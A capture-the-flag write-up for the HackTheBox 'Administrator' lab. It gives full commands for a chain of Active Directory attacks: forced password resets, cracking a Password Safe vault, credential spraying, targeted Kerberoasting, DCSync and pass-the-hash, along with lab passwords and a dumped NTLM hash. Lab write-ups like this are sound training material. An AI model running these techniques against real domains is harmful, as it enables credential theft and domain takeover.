
# HackTheBox — Administrator

 **Difficulty:** Medium | **OS:** Windows 
 
---

## Overview

Administrator is a medium-difficulty Active Directory machine that simulates a realistic Windows pentest scenario. Starting with a low-privileged domain account, the attack path chains multiple AD misconfigurations — `GenericAll`, `ForceChangePassword`, and `GenericWrite` — to escalate laterally across several user accounts before leveraging `GetChangesAll` to perform a DCSync and obtain the domain Administrator hash.

**Attack Path Summary:**

```
Olivia → [GenericAll] → Michael → [ForceChangePassword] → Benjamin
→ [FTP / psafe3] → Alexander / Emily / Emma
→ Emily → [GenericWrite] → Ethan → [GetChangesAll] → DCSync → Administrator
```

---

## Reconnaissance

### Port Scan

```bash
rustscan -a 10.129.2.50 -u 5000 -b 2000 -- -sCV
```

Key open ports confirm a standard Windows Domain Controller:

<img width="1209" height="559" alt="Pasted image 20260522203941" src="https://github.com/user-attachments/assets/9a4856d3-b89f-4b0e-8b8b-529c88f6419f" />

### DNS Enumeration

Fix the hosts file and confirm domain via DNS:

```bash
ntpdate -u 10.129.2.50
echo "10.129.2.50 administrator.htb dc.administrator.htb" | tee -a /etc/hosts
dig NS administrator.htb @10.129.2.50
```

DNS confirms `administrator.htb` is the domain with a single DC at `dc.administrator.htb`.

<img width="707" height="427" alt="Pasted image 20260522203956" src="https://github.com/user-attachments/assets/4a22800e-5e8b-4789-92a1-c86cbaa467ad" />


---

## Initial Foothold

### Provided Credentials

```
Olivia : ichliebedich
```

### BloodHound Enumeration

SMB and WinRM enumeration with Olivia's credentials yield no direct access. Running BloodHound reveals the full attack path:

```bash
bloodhound-python -c ALL -u Olivia -p ichliebedich \
  -d administrator.htb -ns 10.129.2.50 --zip
```

BloodHound identifies two lateral movement vectors from Olivia:

1. **Olivia → Michael** via `GenericAll`
2. **Michael → Benjamin** via `ForceChangePassword`

<img width="844" height="418" alt="Pasted image 20260522204008" src="https://github.com/user-attachments/assets/a7ae3aeb-1e33-460d-bb8f-4f1a797ac2b0" />


---

## Lateral Movement

### Olivia → Michael (GenericAll)

`GenericAll` over a user account grants full control, including the ability to reset the password without knowing the current one.

```bash
bloodyAD --host dc.administrator.htb -d administrator.htb \
  -u Olivia -p ichliebedich \
  set password Michael 'test!123!'
```

**Credentials obtained:** `Michael : test!123!`

---

### Michael → Benjamin (ForceChangePassword)

Michael holds `ForceChangePassword` over Benjamin, allowing a forced password reset:

```bash
bloodyAD --host dc.administrator.htb -d administrator.htb \
  -u Michael -p 'test!123!' \
  set password Benjamin 'test!1234!'
```

**Credentials obtained:** `Benjamin : test!1234!`

---

### Benjamin → FTP Access

Validating Benjamin's credentials against available services:

```bash
nxc ftp 10.129.2.50 -u Benjamin -p 'test!1234!'
```

<img width="645" height="77" alt="Pasted image 20260522204300" src="https://github.com/user-attachments/assets/f9a53b1b-207f-4536-84b0-0cac318400c8" />


FTP access confirmed. The share contains a **Password Safe database**:

```
Backup.psafe3
```

```bash
get Backup.psafe3
```

<img width="1195" height="158" alt="Pasted image 20260522204322" src="https://github.com/user-attachments/assets/16fed66f-e730-4e03-a4b8-bd2ec68a6c12" />


---

## Credential Extraction from Password Safe

### Hash Extraction

```bash
pwsafe2john Backup.psafe3 > backupsafe.hash
```

### Cracking

```bash
john backupsafe.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="730" height="181" alt="Pasted image 20260522204354" src="https://github.com/user-attachments/assets/e7044339-6c8f-407f-b63d-81c9ca1037c3" />


**Master password:** `tekieromucho`

### Database Contents

Opening the vault via `pwsafe` reveals three entries:

|Username|Password|
|---|---|
|`alexander`|`UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`|
|`emily`|`UXLCI5iETUsIBoFVTj8yQFKoHjXmb`|
|`emma`|`WwANQWnmJnGV07WQN8bMS7FMAbjNur`|

<img width="1036" height="471" alt="Pasted image 20260522204435" src="https://github.com/user-attachments/assets/68abcc99-9085-48dd-a888-d7d0610bb2e9" />


<img width="539" height="331" alt="Pasted image 20260522204446" src="https://github.com/user-attachments/assets/61144f2b-ae21-4c49-a914-de543ef33f88" />

### Credential Spray

Spraying all three accounts against WinRM to check for password reuse:

```bash
nxc winrm 10.129.2.50 -u users.txt -p passwords.txt
```

**Hit:** `emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb` — WinRM access confirmed.

<img width="976" height="32" alt="Pasted image 20260522204528" src="https://github.com/user-attachments/assets/b672c554-a9c6-4081-b12a-b86adb1a2d14" />


---

## Privilege Escalation

### BloodHound — Second Iteration

Re-running BloodHound with Emily's context reveals the path to domain compromise:

```
Emily → [GenericWrite] → Ethan → [GetChangesAll] → Domain (DCSync)
```

Emily holds `GenericWrite` over Ethan. Ethan holds `GetChangesAll` on the domain — the privilege required for DCSync.

<img width="1092" height="171" alt="Pasted image 20260522204543" src="https://github.com/user-attachments/assets/57d335bb-ce9a-469c-9c44-8f8d6ab728a5" />


<img width="1013" height="295" alt="Pasted image 20260522204554" src="https://github.com/user-attachments/assets/81200555-24b0-4464-9d90-133aafdc020a" />

### Emily → Ethan (Targeted Kerberoasting)

`GenericWrite` allows writing to a user's `servicePrincipalName` attribute, enabling a **Targeted Kerberoasting** attack: register an SPN on Ethan and request his TGS, which is encrypted with his NTLM hash.

```bash
python3 targetedKerberoast.py \
  -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb \
  -d administrator.htb \
  --dc-host dc.administrator.htb \
  --dc-ip 10.129.2.50 \
  --request-user ethan
```


<img width="1211" height="370" alt="Pasted image 20260522204610" src="https://github.com/user-attachments/assets/83c7359b-7c83-4e66-a521-bf1e54720be2" />

### Hash Cracking

```bash
hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
```

**Credentials obtained:** `ethan : limpbizkit`

---

### DCSync (Ethan → Administrator)

Ethan's `GetChangesAll` privilege over the domain object allows replication of all password hashes via DCSync:

```bash
impacket-secretsdump 'administrator.htb/ethan:limpbizkit@dc.administrator.htb'
```

**Administrator NTLM hash extracted:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```


<img width="1069" height="773" alt="Pasted image 20260522204634" src="https://github.com/user-attachments/assets/94473d03-6d2f-4810-8dd3-aa838c578618" />


---

## Domain Compromise

### Pass-the-Hash

```bash
evil-winrm -i dc.administrator.htb \
  -u administrator \
  -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

Shell obtained as `ADMINISTRATOR\administrator`.

---

## Flags

```powershell
# User flag
type C:\Users\emily\Desktop\user.txt

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

<img width="1114" height="379" alt="Pasted image 20260522204714" src="https://github.com/user-attachments/assets/f1064cb6-b745-47fd-8216-50f97dad543f" />


---

_Writeup by ctxzero — HackTheBox: Administrator_
